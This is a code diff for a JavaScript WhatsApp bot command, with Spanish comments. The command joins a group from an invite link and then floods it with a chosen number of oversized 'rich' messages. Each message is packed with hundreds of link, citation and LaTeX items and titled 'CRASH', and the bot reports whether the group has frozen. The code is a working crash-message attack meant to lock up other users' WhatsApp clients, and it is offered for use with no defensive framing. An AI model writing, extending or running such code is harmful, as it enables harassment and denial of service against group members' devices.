@@ -8,12 +8,15 @@ export default {
 
   async run({ sock, from, text, cmdName, reply }) {
     if (!text || !text.includes("whatsapp.com")) {
-      return reply({ text: `Pásame el enlace. Ej: .${cmdName} https://chat.whatsapp.com/XXXX` });
+      return reply({ text: `Pásame el enlace. Ej: .${cmdName} https://chat.whatsapp.com/XXXX 5` });
     }
 
     const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
     if (!match) return reply({ text: "Enlace inválido." });
     const code = match[1];
+
+    const partes = text.split(/\s+/);
+    const cant = parseInt(partes[1]) || 5;
 
     let groupId;
     try {
@@ -24,25 +27,28 @@ export default {
     try { await sock.groupAcceptInvite(code); } catch {}
     await new Promise((r) => setTimeout(r, 2500));
 
-    await reply({ text: `💥 Crasheando ${groupId}...` });
+    await reply({ text: `💥 Mandando ${cant} rich a ${groupId}...` });
 
-    // UN SOLO rich, pero gigante. Nada de paralelo.
-    const rich = new AIRich(sock);
-    rich.setTitle("💥💥💥 CRASH 💥💥💥");
+    for (let b = 0; b < cant; b++) {
+      const rich = new AIRich(sock);
+      rich.setTitle(`💥 CRASH ${b + 1}/${cant}`);
+      for (let i = 0; i < 300; i++) {
+        rich.addText(`Item ${i} [x](https://x.com) [](https://y.com) $x^2$`);
+      }
+      rich.addSuggest(["a","b","c","d","e","f","g","h","i","j"]);
+      rich.setFooter("boom 💀");
 
-    // 1500 items con todo activado: link + citation + latex
-    for (let i = 0; i < 1500; i++) {
-      rich.addText(`Item ${i} [x](https://x.com) [](https://y.com) $\\sum_{n=1}^{\\infty} \\frac{1}{n^2} = \\frac{\\pi^2}{6}$`);
+      try {
+        await rich.send(groupId);
+        await reply({ text: `✅ ${b + 1}/${cant} enviado` });
+      } catch (e) {
+        await reply({ text: `❌ ${b + 1} falló: ${e.message}` });
+      }
+
+      // espera entre mensajes para que el cliente procese
+      await new Promise((r) => setTimeout(r, 1500));
     }
 
-    rich.addSuggest(["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15"]);
-    rich.setFooter("boom 💀");
-
-    try {
-      await rich.send(groupId);
-      return reply({ text: "✅ rich enviado. Revisa si el grupo se trabó." });
-    } catch (e) {
-      return reply({ text: `❌ ${e.message}` });
-    }
+    return reply({ text: "✅ terminado." });
   },
 };
